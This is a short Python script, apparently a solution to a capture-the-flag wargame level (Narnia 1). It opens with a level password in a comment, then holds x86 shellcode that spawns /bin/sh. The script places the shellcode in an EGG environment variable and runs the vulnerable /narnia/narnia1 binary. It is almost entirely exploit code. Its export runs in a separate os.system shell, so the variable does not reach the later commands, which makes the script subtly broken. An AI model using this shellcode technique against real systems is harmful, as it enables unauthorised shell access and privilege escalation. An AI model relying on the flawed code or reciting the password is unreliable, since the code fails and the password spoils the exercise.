#password: efeidiedae
import base64
import os

shellcode =  b"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e"
shellcode += b"\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3"
shellcode += b"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
shellcode += b"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x4e"
payload = base64.b64encode(shellcode).decode()
cmd = "export EGG=`echo {0} | base64 -d`".format(payload)
os.system(cmd)
os.system("echo $EGG;")
os.system("/narnia/narnia1")
